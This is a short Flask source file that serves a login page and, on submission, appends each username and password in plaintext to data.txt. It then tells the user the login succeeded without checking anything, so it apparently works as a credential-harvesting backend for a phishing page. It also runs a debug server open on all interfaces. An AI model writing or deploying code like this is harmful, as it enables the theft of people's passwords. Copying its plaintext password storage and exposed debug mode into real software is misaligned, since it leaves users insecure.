from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if username and password:
        with open("data.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        return "Your Account login Successfully"
    else:
        return "Missing credentials"

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)

